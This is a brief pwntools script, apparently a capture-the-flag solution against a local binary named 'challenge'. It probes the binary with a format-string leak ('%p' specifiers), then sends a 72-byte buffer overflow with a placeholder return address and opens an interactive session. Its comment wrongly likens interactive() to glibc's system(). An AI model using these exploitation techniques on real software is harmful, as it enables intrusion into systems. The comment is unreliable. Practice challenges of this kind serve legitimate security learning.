from pwn import *

p = process("./challenge")

p.sendline(b"%p %p %p %p")
print(p.recv())

payload = b"A"*72 + p64(0xdeadbeef)
p.sendline(payload)

#Switches control to user Similar to system() in glibc 
p.interactive()
